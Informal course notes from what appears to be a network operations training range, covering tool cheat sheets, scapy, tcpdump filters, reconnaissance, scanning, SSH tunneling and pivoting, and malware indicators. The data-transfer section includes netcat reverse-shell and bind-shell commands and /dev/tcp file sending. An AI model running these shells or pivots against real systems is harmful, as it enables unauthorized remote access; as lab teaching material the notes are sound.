Public Antora
https://net.cybbh.io/public/networking/latest/index.html
Activity CTFd
http://10.50.20.75:8000/
Practice CTFd
http://10.50.22.14:8000/
Miro Whiteboard
https://miro.com/app/board/o9J_klSqCSY=/
---------------------------------------------------------------------------------------------------------------------------------------------------
The map of the environment has been provided in your home directory:
    student_net_range_blue_only.png

All activity PCAPS are provided here:
    /home/activity_resources/pcaps 

Below are a series of useful commands installed on this Internet_Host to use while you are in this course.

    1. To view your IP address and interface information:
        a. current =        ip address (ip addr)
        b. deprecated =     ifconfig

    2. To view your ARP cache:
        a. current =        ip neighbor (ip nei)
        b. deprecated =     arp -a

    3. To view open TCP and UDP sockets:
        a. current = 
            i. TCP =        ss -antlp
            ii. UDP =       ss -anulp
        b. deprecated =     netstat

    4. To view active processes:
        a. static =         ps -elf
        b. real-time =      top or htop

    5. To open file manager from the command line or X11 connection:
        a. nautilus
        b. pcmanfm

    6. Web Browsers:
        a. Firefox
        b. Chromium
        c. Konqueror

    7. To open images from the command line or X11 connection:
        a. Eye of Gnome =                   eog [file]
        b. Nomacs =                         nomacs [file]
        c. Eye of Mate =                    eom [file]
        d. GNU Image Manipulation Program = gimp [file]

    8. Network scanning:
        a. nmap
            -sT = TCP Full connection
            -sS = TCP SYN scanning
            -Pn = Disable ping sweep
            -sU = UDP scanning
        b. zenmap
        c. netcat
            TCP: nc -nzvw1 10.10.0.40 21-23 80
            UDP: nc -unzvw1 10.10.0.40 53 69
        d. ping
        e. traceroute

    9. Network Utilization:
        a. iftop
        b. iptraf-ng

    10. Packet Manipulation (requires root privileges):
        a. scapy
        b. hping3
        c. yersinia     yersinia -G

    11. Packet Sniffing (requires root privileges):
        a. Wireshark
        b. tcpdump
        c. p0f
        d. tshark

    12. Banner Grabbing:
        a. netcat
            Client: nc 10.10.0.40 22
            Listener: nc -lvp 1234
        b. telnet
            telnet 10.10.0.40
        c. wget
            wget -r http://10.10.0.40
            wget -r ftp://10.10.0.40
        d. curl
            curl http://10.10.0.40
            curl ftp://10.10.0.40

    13. DNS Query:
        a. whois
        b. dig
            Records:
                A - IPv4
                AAAA - IPv6
                NS - Name Server
                SOA - Start of Authority
                MX - Mail Server
                TXT - Human readable message

    14. Remote access:
        a. ssh
            ssh student@10.10.0.40
            ssh student@10.10.0.40 -p 2222
        b. telnet
            telnet 10.10.0.40
            telnet 10.10.0.40 23

    15. File Transfer:
        a. scp
            scp student@10.10.0.40:file .
            scp file student@10.10.0.40:
        b. netcat
            nc 10.10.0.40 1234 < file
            nc -lvp 1234 > file




----------------------------------------------------------------------------------------------------------------------------------------------------------
OSI MODEL: 
7 Layers:
Physical
Data Link
Network 
Transport
Session
Presentation
Application
-----------------------------------------------------------------------------------------------------------------------------------------------------------
PHYSICAL LAYER RESPONSIBILITIES
Hardware Specifications
Encoding and Signaling
Data Transmission and Reception
Physical Network Design
----------------------------------------------------------------------------------------------------------------------------------------------------------
DATA LINK SUB-LAYERS
MAC (Media Access Control)
LLC (Logical Link Control)


---------------------------------------------------------------------------------------------------------------------------------------------------------





--------------------------------------------------------------------------------------------------------------------------------------------------------
sudo scapy
a=Ether()      ==== sets a as ethernet which is built in 
a.show()      -shows you the output of dst, src and type

###[ Ethernet ]### 
  dst       = ff:ff:ff:ff:ff:ff
  src       = fa:16:3e:35:0d:0e
  type      = 0x9000
  
 
  a.type=0x0806                                 ------------------------- to change the type 
  
  
###[ Ethernet ]### 
  dst       = ff:ff:ff:ff:ff:ff
  src       = fa:16:3e:35:0d:0e
  type      = ARP
  
  
  
  b=Dot1Q()               ===== es b as  the type of 802.Dot1Q 


b.show()
###[ 802.1Q ]### 
  prio      = 0
  id        = 0
  vlan      = 1
  type      = 0x0

b.vlan=200     ---- sets vlan as 200.(200 is aarbitraty number for the sake of this exercise)


c=IP()   ==== sets c as veriable for IP
>>> c.show()
###[ IP ]### 
  version   = 4
  ihl       = None
  tos       = 0x0
  len       = None
  id        = 1
  flags     = 
  frag      = 0
  ttl       = 64
  proto     = hopopt
  chksum    = None
  src       = 127.0.0.1
  dst       = 127.0.0.1
  \options   \


d=ICMP()
>>> d.show()
###[ ICMP ]### 
  type      = echo-request
  code      = 0
  chksum    = None
  id        = 0x0
  seq       = 0x0
  unused    = ''



sendp(a/b/c/d, iface="eth0")      - sending a packet that was custom crafted




create additional vlan header
 e=Dot1Q()

 e.show()
###[ 802.1Q ]### 
  prio      = 0
  id        = 0
  vlan      = 1
  type      = 0x0

 e.vlan=4444
>>> sendp(a/b/c/d, iface="eth0")
.
Sent 1 packets.

------------------------------------------------------------------------------------------------------------------------------------------------------------

 DAY-2
 --------------------------------------------------------------------------------------------------------------------------------------------------------
 *TCPDUMP
 sudo tcpdump 
 sudo tcpdump -D ( gives you choices for all interface options)
 
 
 sudo tcpdump -i eth0     ---- captures only on eth0
 sudo tcpdump -i eth0 -X    - gives you hex duump 
 sudo tcpdump -i eth0 -XX --- shows ou the ethernet header aswell 
 sudo tcpdump -i eth0 -XX -W writes it to a different file to save
 -V verbose( can stack multiple times)
 
 sudo tcpdump port 80 or 22
 sudo tcpdump portrange 20-100
sudo tcpdump "src net 10.10.0.0/24 && (dst net 10.1.0.0/24) && (! dst host 10.1.0.3)   ----- searches for a source network of (range) to dst network of
(range) bit not the network 10.1.0.3)
---------------------------------------------------------------------------------------------------------------------------------------------------------
* BERKELEY PACKET FILTERS:

BERKELEY PACKET FILTERS (BPF)
Requests a SOCK_RAW socket and setsockopt calls SO_ATTACH_FILTER

sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))
...
setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, ...)

 tcpdump

BERKELEY PACKET FILTERS
Using BPFs with operators, bitmasking, and TCPDump creates a powerful tool for traffic filtering and parsing.

tcpdump {A} [B:C] {D} {E} {F} {G}

A = Protocol (ether | arp | ip | ip6 | icmp | tcp | udp)
B = Header Byte offset
C = optional: Byte Length. Can be 1, 2 or 4 (default 1)
D = optional: Bitwise mask (&)
E = Operator (= | == | > | < | <= | >= | != | () | << | >>)
F = Result of Expresion
G = optional: Logical Operator (&& ||) to bridge expressions

Example:
tcpdump 'ether[12:2] = 0x0800 && (tcp[2:2] != 22 && tcp[2:2] != 23)'      
(goes to the ether header 12th bytes and looks at the next to byte)  ----- *(ether[12:2])*
 = 0x0800 ------ Look at the bytes and make sure the value is 0800(ipv4) and  go to the tcp header 2nd byte and looks a the next two btyes. and make sure 
 it's not port 23  *(tcp[2:2] != 23)')*

BITWISE MASKING
To filter down to the bit(s) and not just the byte.
ip[0] & 0x0F > 0x05   (look at ip byte zero and this value (0x0F) and match it to 0x05)

---------------------------------------
FILTER LOGIC - MOST EXCLUSIVE    ( must be that value)

All designated bit values must be set; no others can be set
tcp[13] = 0x11        --- tcp byte 13 HAS to equal  to 0x11  ( matches everything to make sure nothing else is turned on ) 
--or--
tcp[13] & 0xFF = 0x11

FILTER LOGIC - LESS EXCLUSIVE     ---- (dont care about other flags)
All designated bits must be set; all others may be set

tcp[13] & 0x11 = 0x11    --- go to  the tcp byte 13 and make sure ack and fin are turned on  (0x11) then make sure it equal to the 0x11
 less doesnt care whatever you have turned on just the ones it wants.
--------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
 
________________________________________________________________________________________________________________________________________________________
SDAY 2
---------------------------------------------------------------------------------------------------------------------------------------------------------
3 different types of socket:
Stream
Datagram 
Raw sockets
-------
Stream Sockets - Connection oriented and sequenced; methods for connection establishment and tear-down. Used with TCP, SCTP, and Bluetooth.
Datagram Sockets - Connectionless; designed for quickly sending and receiving data. Used with UDP.
Raw Sockets - Direct sending and receiving of IP packets without automatic protocol-specific formatting.
------


USER SPACE VS. KERNEL SPACE SOCKETS
User Space Sockets
    Stream Sockets
    Datagram Sockets
Kernel Space Sockets
    Raw Sockets

SOCKET CREATION AND PRIVILEGE LEVEL
User Space Sockets - The most common sockets that do not require elevated privileges to perform actions on behalf of user applications.
Kernel Space Sockets - Attempts to access hardware directly on behalf of a user application to either prevent encapsulation/decapsulation or to create packets from scratch, which requires elevated privileges.

USER SPACE APPLICATIONS/SOCKETS
Using tcpdump or wireshark to read a file
Using nmap with no switches
Using netcat to connect to a listener
Using netcat to create a listener above the well known port range(1024+)
Using /dev/tcp or /dev/udp to transmit data

KERNEL SPACE APPLICATIONS/SOCKETS
Using tcpdump or wireshark to capture packets on the wire
Using nmap for OS identification or to set specific flags when scanning
Using netcat to create a listener in the well known port range (0 - 1023)
Using Scapy to craft or modify a packet for transmission
----------------------------------------------------------------------------------------------------------------------------------------------------------
THE SOCKET.SOCKET FUNCTION
Inside the socket.socket. function, you have these arguments, in order:
socket.socket([*family*[,*type*[*proto*]]])
family constants should be: AF_INET (default), AF_INET6, AF_UNIX
type constants should be: SOCK_STREAM (default), SOCK_DGRAM, SOCK_RAW
proto constants should be: 0 (default), IPPROTO_RAW

--------------------------------------------------------------------------------------------------------------------------------------------------------
RAW IPV4 SOCKETS
Raw Socket scripts must include the IP header and the next headers.
Requires guidance from the "Request for Comments" (RFC)to follow header structure properly.
RFCs contain technical and organizational documents about the Internet, including specifications and policy documents.
See RFC 791, Section 3 - Specification for details on how to construct an IPv4 header.


RAW SOCKET USE CASE
Testing specific defense mechanisms - such as triggering and IDS for an effect, or filtering=
Avoiding defense mechanisms
Obfuscating data during transfer
Manually crafting a packet with the chosen data in header fields

--------------------------------------------------------------------------------------------------------------------------------------------------------
Encoding
The process of taking bits and converting them using a specified cipher.
Decoding
Reverse of the conversion process used by the specified cipher for encoding.
Common encoding schemes
UTF-8, Base64, Hex



-------------------------------------------------------------------------------------------------------------------------------------------------------------
__________________________________________________________________________________________________________________________________________________________
DAY 3
Reconnaissance
--------------------------------------------------------------------------------------------------------------------------------------------------------
RECONNAISSANCE
Active

Passive

Internal

External

-------------------------------------------------------------------------------------------------------------------------------------------------------
PASSIVE RECONNAISSANCE
Gathering information about targets without direct interaction
Not as straight forward and requires more time than active reconnaissance
Lower risk of discovery

Involves identifying:
IP addresses and Sub-Domains
External and 3rd party sites
People and Technologies
Content of Interest
Vulnerabilities

Possible tools for gathering:
WHOIS queries
Job site listings
Phone Numbers
Google searches
Passive OS fingerprinting

-------------------------------------------------------------------------------------
PASSIVE EXTERNAL NETWORK RECONNAISSANCE
Information gathered outside of the network using passive methods
Allows for more efficient attacks and plans

PASSIVE EXTERNAL NETWORK RECONNAISSANCE: DNS
Resolves hostnames to IP addresses
RFC 3912
WHOIS queries

PASSIVE EXTERNAL NETWORK RECONNAISSANCE: DIG
Typically between primary and secondary DNS servers
If allowed to transfer externally hostnames, IPs, and IP blocks can be determined

whois ( domain name ) 
dig ( domain name)
dig axfr @(domain mname) for zone transfer

PASSIVE EXTERNAL NETWORK RECONNAISSANCE: ZONE TRANSFERS
Returns DNS information
Supplements base queries

PASSIVE EXTERNAL NETWORK RECONNAISSANCE: HOST HISTORY
netcraft
wayback machine

PASSIVE EXTERNAL NETWORK RECONNAISSANCE: GOOGLE SEARCHES
subdomains
technologies

PASSIVE EXTERNAL NETWORK RECONNAISSANCE: SHODAN
Reveals information about technologies, remote access services, improperly configured services, and network infrastructure.
When selected can give additional information and applicable vulnerabilities

--------------------------------------------------------------------------------------------------------------------------------------------------------
NETWORK SCANNING
Scanning Strategy
Remote to Local
Local to Remote
Local to Local
Remote to Remote

Scanning Approach:
Aim
    Wide range target scan
    Target specific scan
Method
    Single source scan
    Distributed scan

NETWORK SCANNING:
Broadcast Ping and Ping sweep
(for i in {1..254} ;do (ping -c 1 10.10.0.$i | grep "bytes from" &) ;done)
(for /L %i in (1,1,255) do @ping -n 1 -w 200 10.10.0.%i > nul && echo 192.168.1.%i is up.)
ARP scan
SYN scan
(nmap -sS -p- 192.168.56.102 )
Full connect scan
Null scan
FIN scan
XMAS tree scan
UDP scan
Idle scan

NETWORK SCANNING
ACK/Window scan
RPC scan
FTP scan
decoy scan
OS fingerprinting scan
version scan
Protocol ping
Discovery probes
SCTP INIT scan

NETWORK SCANNING - CODE
Example Syntax
nmap [Options] [Target IP/ Subnet]
nc [Options] [Target IP] [Target Port]
(nc  -help / man nc curl cht.sh/nc )

nc -zv localhost(127.0.0.1) 22

*******-----------------------------------------------------------------------------------------------------------******
#!/bin/bash
echo "Enter network address (e.g. 192.168.0): "
read net
echo "Enter starting host range (e.g. 1): "
read start
echo "Enter ending host range (e.g. 254): "
read end
echo "Enter ports space-delimited (e.g. 21-23 80): "
read ports
for ((i=$start; $i<=$end; i++))
do
    nc -nvzw1 $net.$i $ports 2>&1 | grep -E 'succ|open'
done
# (-v) running verbosely (-v on Linux, -vv on Windows),
# (-n) not resolving names. numeric only IP(no D.S)
# (-z) without sending any data. zero-I/O mode(used for scanning)
#(-w1) waiting no more than 1second for a connection to occur
# (2>&1) redirect STDERR to STDOUT. Results of scan are errors and need to redirect to output to grep
# (-E) Interpret PATTERN as an extended regular expression
# ( | grep open) for Debian to display only open connections
# ( | grep succeeded) for Ubuntu to display only the open connections

(NETCAT )

^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
NMAP
nmap 10.10.0.40/27 -v


Nmap scan report for 10.10.0.40
Host is up (0.00024s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
3389/tcp open  ms-wbt-server

Nmap scan report for 10.10.0.62
Host is up (0.00034s latency).
All 1000 scanned ports on 10.10.0.62 are closed

nmap  10.10.0.40/27 -v -Pn -T5 -p 20-25,80
( if you get filtered then there's a an  acl set 
if get closed response that means the box responded wtih it )

nmap  10.10.0.40/27 -v -Pn -T5 -p-   ( scans every known port with the -p- option) 
*******------------------------------------------------------------------------------------************
HOST ENUM 
ip a 
netstat -ntlp    ----- listening 
netstat -antp   ----- all established and listening port 
 ps -elf 
 
 
 
 
 nmap 10.50.33.207
nc 10.50.33.207 23
nc 10.50.33.207 80
GET   


 wget -r  10.50.33.207/    ----- get's it recursively as well as hidden ones 
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 DAY-4
 DATA TRANSFER  MOVEMENT and REDIRECTION
 ------------------------------------------------------------------------------------------------------------------------------------------------------
DESCRIBE COMMON METHODS FOR TRANSFERRING DATA
TFTP
FTP
    Active
    Passive
SFTP   ----
SCP    - uses ssh channel 

TFTP
Trivial File Transfer Protocol

RFC 1350 Rev2
UDP transport
Extremely small and very simple communication
No terminal communication () (no console)
Insecure (no authentication or encryption)
No directory services
Used often for technologies such as BOOTP and PXE

FTP
File Transfer Protocol

RFC 959
TCP transport
Uses multiple TCP connections
Control Connection (21) / Data Connection (20)
Authentication through clear-text sign in (username and password)
Insecure in default configuration
Has directory services

SFTP
Secure File Transfer Protocol
TCP transport (TCP port 22)
Uses symmetric and asymmetric encryption
Adds FTP like services to SSH
Authentication through sign in (username and password) or with SSH key
Interactive terminal access


FTPS
File Transfer Protocol Secure
TCP transport (TCP port 443)
Adds SSL/TLS encryption to FTP
Authentication with username/password and/or PKI
Interactive terminal access
-------------------------------------------------------------------------------

SCP
Secure Copy Protocol
TCP Transport (TCP port 22)
Uses symmetric and asymmetric encryption
Authentication through sign in (username and password) or with SSH key
Non Interactive
 
 
Download a file from a remote directory to a local directory
  scp student@172.16.82.106:secretstuff.txt /home/student
  
Upload a file to a remote directory from a local directory
  scp secretstuff.txt student@172.16.82.106:/home/student

Copy a file from a remote host to a separate remote host
 scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student


SCP SYNTAX W/ ALTERNATE SSHD
Download a file from a remote directory to a local directory
 scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student
 
 Upload a file to a remote directory from a local directory
    scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student
 
 SCP SYNTAX THROUGH A TUNNEL
ssh student@172.16.82.106 -L 1111:localhost:22 -NT
Download a file from a remote directory to a local directory
    scp -P 1111 student@localhost:secretstuff.txt /home/student               (use -P to use it on a alternate page)
    
Upload a file to a remote directory from a local directory
    scp -P 1111 secretstuff.txt student@localhost:/home/student
    
    
--------------------------------------------------------------------------------------------------------------------------------------------------------
TRAFFIC REDIRECTION USING TOOLS

NETCAT
NETCAT is the "swiss army knife" networking utility which reads and writes data across network socket connections using the TCP/IP protocol.
It is designed to be a reliable "back end" tool that can be used directly or easily driven by other programs and scripts.

Can be used for the following:
    inbound and outbound connections, TCP/UDP, to or from any ports
    troubleshooting network connections
    sending/receiving data (insecurely)
    port scanning (similar to -sT in Nmap)
    
NETCAT: CLIENT TO LISTENER FILE TRANSFER
    Client (sends file): nc 10.2.0.2 9001 < file.txt
Listener (receive file): nc -l -p 9001 > newfile.txt

NETCAT: LISTENER TO CLIENT FILE TRANSFER
Listener (sends file): nc -l -p 9001 < file.txt
Client (receive file): nc 10.2.0.2 9001 > newfile.txt
   
   (net CAT DEMO )
   nc -l -p 2345 ( remote listening port) 
   
   nc 172.16.82.106 2345   ( connect to the remote host on port 2345 )
   
   

    
    
NETCAT RELAY DEMOS
On Client Relay:
mknod mypipe p
nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe
On Listener2 (sends info):

nc -l -p 9002 < infile.txt
On Listener1 (receives info):

nc -l -p 9001 > outfile.txt
Writes the output to listener1 and listener2 through the named pipe
 
 
 mknod <name> p 
  makes a node 
  
  mkfifo Mypipe 
     makes a named pipe
     
     nc -lp 3333 > Mypipe | nc -lp  4444 < Mypipe     
     anything coming to my port 3333 goes to Mypipe and anything on Mypipe goes to  listening port 4444
     
      to access it i'd need to connect vua diff one 
      
     (
      nc -lp 3333 > Mypipe | nc -lp  4444 < Mypipe   ( the one being used as  named pipe machine) 
      nc 172.16.82.106 4444 > Supersecretstuff.txt ( the one that wants the info ) 
      nc 192.168.1.1 3333 < test  (the one sending the info via named pipe)

     
     
  FILE TRANSFER WITH /DEV/TCP
On the receiving box:
nc -l -p 1111 > file.txt

On the sending box:
cat file.txt > /dev/tcp/10.2.0.2/1111

This method is useful for host that does not have NETCAT available.
 
 
 
REVERSE SHELL USING NETCAT
When shelled into the remote host using -c :
nc -c /bin/sh <your ip> <any unfiltered port>

You could even pipe BASH through NETCAT.
/bin/sh | nc <your ip> <any unfiltered port>

Then listen for the shell.
nc -l -p <same unfiltered port> -vvv

You can also listen using the -e with NETCAT.
nc -l -p <any unfiltered port> -e /bin/bash
 
 
 --------------------------------------------------------------------------------------------------------------------------------------------------
 SSH
Various Implementations (v1 and v2)
Provides authentication, encryption, and integrity.
Allows remote terminal sessions
Used for tunneling
Created as a secure replacement for Berkeley Remote commands:
rsh - replaced with ssh, provides a channel for running a shell on a remote computer.
rlogin - replaced with rlogin, provides remote login capability.
rcp - replaced with scp for secure file transfer
sftp (not a unix r command replacement) - creates remote directory listing and file transfer capability over SSH
  
  
SSH PORT FORWARDING           ( can be used to bypass security measures and get access to network not availabe via conventional method

Creates channels using SSH-CONN protocol
Allows for tunneling of other services through SSH
Provides insecure services encryption
-------------------------------------------------------------------------------------------------------------------------------------------
SSH LOCAL PORT FORWARDING

Syntax
ssh -p <optional alt port> <user>@<pivot ip> -L <local bind port>:<tgt ip>:<tgt port> -NT
or
ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <us


SSH LOCAL PORT FORWARDING
Creates a local port (1111) on the local host that forwards to a target machine’s port 80.
ssh student@172.16.82.106 -L 1111:localhost:80 -NT
or
ssh -L 1111:localhost:80 student@172.16.82.106 -NT


SSH LOCAL PORT FORWARDING THROUGH A LOCAL PORT
Internet Host:
ssh student@172.16.1.15 -L 1111:172.16.40.10:22 -NT
ssh student@localhost -p 1111 -L 2222:172.16.82.106:80 -NT
firefox localhost:2222
Creates an additional local port on the local host that forwards to a target machine through the previous channel created.

when you do ssh student@localhost on your  own box on port 1111 it's basically using the shortcut to 40.10 which is then (-L 2222:172.16.82.106:80 -NT) 
setting up another tunnel to go to .82.106 on port 80.




SSH DYNAMIC PORT FORWARDING
Syntax
ssh -D <port> -p <alt port> <user>@<pivot ip> -NT
Proxychains default port is 9050
Creates a dynamic socks4 proxy that interacts alone, or with a previously established remote or local port forward.
Allows the use of scripts and other userspace programs through the tunnel.


SSH DYNAMIC PORT FORWARDING 1-STEP
Blue Private Host-1:
ssh student@172.16.82.106 -D 9050 -NT


SSH DYNAMIC PORT FORWARDING 2-STEP
Blue Private Host-1:
ssh student@172.16.82.106 -L 1111:10.10.0.40:22 -NT
ssh student@localhost -D 9050 -p 1111 -NT

proxychains curl ftp://www.onlineftp.ch
proxychains wget -r www.espn.com
proxychains ./scan.sh
proxychains ssh student@172.16.101.2

 
 port bind from internet host to priv host via blue hosts
 ssh student@172.16.82.106 -L 1111:192.168.1.10:22 -NT

ssh localhost -p 1111  ( to ssh from internet host directly to priv host)
ssh localhost -p 1111 -D 9050  -NT  ( to get your tool across , -D allows you to use proxy chains from your device ) 
when using nmap -Pn to disaple ping whne using proxychains ) 

 proxychains nmap -Pn localhost ( localhost in this scnerio is the 192.168.1.10) 
 proxychains nmap -Pn 127.0.0.1
proxychains nc localhost 9001

-----------------------------------------------------------------------------------------------------------------------------------------------------


SSH REMOTE PORT FORWARDING
Syntax

ssh -p <optional alt port> <user>@<remote ip> -R <remote bind port>:<tgt ip>:<tgt port> -NT
or
ssh -R <remote bind port>:<tgt ip>:<tgt port> -p <alt port> <us

SSH DYNAMIC PORT FORWARDING 2-STEP
Blue Private Host-1:
ssh student@172.16.82.106 -L 1111:10.10.0.40:22 -NT
ssh student@localhost -D 9050 -p 1111 -NT

proxychains curl ftp://www.onlineftp.ch
proxychains wget -r www.espn.com
proxychains ./scan.sh
proxychains ssh student@172.16.101.2

-------------------------------------------------------------------------------------------------------------------

SSH REMOTE PORT FORWARDING
Syntax
ssh -p <optional alt port> <user>@<remote ip> -R <remote bind port>:<tgt ip>:<tgt port> -NT
or
ssh -R <remote bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<remote ip> -NT

SSH REMOTE PORT FORWARDING
Blue Host-1
ssh student@10.10.0.40 -R 1111:localhost:80 -NT
Creates a remote port on the remote’s local host that forwards to the target specified.
 
 
SSH REMOTE AND LOCAL PORT FORWARDING
Blue Private Host-1:
ssh student@172.16.82.106 -R 1111:localhost:22 -NT

Internet Host:
ssh student@172.16.82.106 -L 2222:localhost:1111 -NT
Internet Host:
ssh localhost -p 2222
Creates a remote port on a remote machine, staging a connection.
Also creates a local port on the localhost to connect to the previously staged connection.
Login to extra1 via the net1 local port forward


----------------------------------------------------------------------------------------------------------------------------------
 (IMPORTANT)
 ssh 192.168.1.1 -R 6789:localhost:22 -NT
 (open an  remote port 6789 on blue host that connects to blue priv  on port 22)
 ssh 172.16.82.106 -L 9999:localhost:6789
 create a ssh tunnel to blue host on port 9999 then look at bluehost for the link 6789 on the (localhost) blue host  to connect to the blue-priv
 
 ssh localhost -p 9999

 
 
 
 
 
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------
COVERT CHANNEL
A Covert Channel is a method of creating a capability to transfer information objects between endpoints that should not be allowed based on policy.
Strategies attackers use to avoid detection:
Tunnels
ICMP
DNS
HTTP
 
 
-------------------------------------------------------------------------------------------------------------------------------------------------------
METHODOLGY
--------------------------------------------------------------------------------------------------------------------------------------------------------
ACTIVE ---- Recon 
 you are sending packets there
 
 PASSIVE ----- Recon
 tcp dump , baiscally sitting there waiting to see what's going on , just observing the flow of the traffic
 

Recon Methodolgy 
1.Host Discovery ( nmap , nc , ./scan.sh, ping sweep)
nmap -Pn

 Linux Ping Sweep
for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done   9 only need to change ip ) 
Windows Ping Sweep
for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.


2. Port Discovery(nmap, nc, /scan.sh)


3.Port validation ( Bannergrabbing  aka use netcat on the ip and port)
nc <ipadd> <port> ( -u for udp)

4.Follow on actions based on ports found
4a. if it's 22-23  - connect to it and do PASSIVE RECON
4b. if it's 21 or 80- wget -r <ip addr>  or for ftp wget -r ftp://<ip addr> (PULL THE FILES)

Scanning Methodology
1.Quick Scan ports: 21-23,80
2. scan specific ports based on hints/clues found
3.Well Known Ports: 0-1023
4.1 -10000 
5.1-65536 ( hail mary)

Passive Recon Methodology
hostname
ip addr 
 ip a, ifconfig (interface and subnet)

arp -a,  ip neigh (neighbours , dont care about failed)
ip neigh | egrep -vi "FAILED"
ss -ntlp  ( other listening ports? ) maybe filtered ones if ssh is filterted for internal use reverse tunnel from the remote port) 
(File of interest) ls /usr/cctc/share ( default  file of interest)
Available tools: command to tell you if there's a tool you want 
which tcpdump wireshark nmap telnet wget curl

Passive Recon
how can i go beyond this current box and go futher into other  boxes 
 
--------------------------------------------------------------------------------------------------------------------------------------------------------
NETWORK ANALYSIS
--------------------------------------------------------------------------------------------------------------------------------------------------------
FINGERPRINTING AND HOST IDENTIFICATION
Variances in the RFC implementation for different OS’s and systems enables the capability for fingerprinting
Tools used for fingerprinting and host identification can be used passively(sniffing/fingerprinting) or actively(scanning)


P0F (PASSIVE OS FINGERPRINTING)
Looks at variations in initial TTL, fragmentation flag, default IP header packet length, window size, and TCP options
Configuration stored in:
 /etc/p0f/p0f.fp


NETWORK TRAFFIC SNIFFING
What makes traffic capture possible?

Libpcap
WinPcap (outdated)
NPCAP

---------------------------------------------------------------------------------------------

NETWORK TRAFFIC BASELINING
Snapshot of what the network looks like during a time frame
No industry standard
7 days to establish the initial snapshot
Prerequisite Information

NETWORK BASELINE OBJECTIVE
Determines the current state of your network
Ascertain the current utilization of network resources
Identify normal vs peak network traffic time frames
Verify port / protocol usage

ANALYZE NETWORK TRAFFIC STATISTICS
Protocol Hierarchy
Conversations
Endpoints
I/O Graph
IPv4 and IPv6 Statistics
Expert Information

--------------------------------------------------------------
NETWORK DATA TYPES
Full Packet Capture Data
Session Data
    sflow
    NetFlow
Statistical Data
Packet String Data
Alert Data
Log Data

DATA COLLECTION DEVICES
Sensors
    In-Line
    Passive
    
METHODS OF DATA COLLECTION
TAP
SPAN
ARP Spoofing (MitM)

ANOMALY DETECTION
Indicator of Attack (IOA)
    Proactive
    A series of actions that are suspicious together
    Focus on Intent
    Looks for what must happen
        Code execution. persistence, lateral movement, etc.
    
    
ANOMALY DETECTION
Indicator of Compromise (IOC)
Reactive
Forensic Evidence
Provides Information that can change
    Malware, IP addresses, exploits, signatures
    
    
INDICATORS
.exe/executable files
NOP sled
Repeated Letters
Well Known Signatures
Mismatched Protocols
Unusual traffic
Large amounts of traffic/ unusual times   
    
    
POTENTIAL INDICATORS OF ATTACK
Destinations
Ports
Public Servers/DMZs
Off-Hours
Network Scans
Alarm Events
Malware Reinfection
Remote logins
High levels of email protocols
DNS queries    
    
    
    
POTENTIAL INDICATORS OF COMPROMISE
Unusual traffic outbound
Anomalous user login or account use
Size of responses for HTML
High number of requests for the same files
Using non-standard ports/ application-port mismatch
Writing changes to the registry/system files
DNS requests
Unexpected/ unusual patching
Unusual tasks    

----------------------------------------------------------------------------------------------------------------------------------------------------
TYPES OF MALWARE
Adware/Spyware
    large amounts of traffic/ unusual traffic
    IOA
        Destinations
    IOC
        Unusual traffic outbound
Virus
    phishing/ watering hole
    IOA
        Alarm Events, Email protocols
    IOC
        changes to the registry/ system files
Worm
    phishing/ watering hole
    IOA
        Alarm events
    IOC
        changes to registry/ system files
Trojan
    beaconing
    IOA
        Destinations
    IOC
        Unusual traffic outbound, unusual tasks, changes to registry/ system files
        
 Rootkit
    IOA
        Malware reinfection
    IOC
        Anomalous user login/ account use
Backdoor
    IOA
        Remote logins
    IOC
        Anomalous user login/ account use
Botnets
    large amounts of IPs
    IOA
        Destinations, remote logins
    IOC
        Unusual tasks, anomalous user login/ account use
    Polymorphic and Metamorphic Malware
        Depends on the malware type/class

Information-Stealing Worms
phishing/ watering hole, large amounts of traffic/ unusual traffic
IOA
Alarm events, Destinations
IOC
changes to registry/ system files, Unusual traffic outbound
BIOS/ Firmware Malware
IOA
Malware reinfection
IOC
Depends on the malware type/class
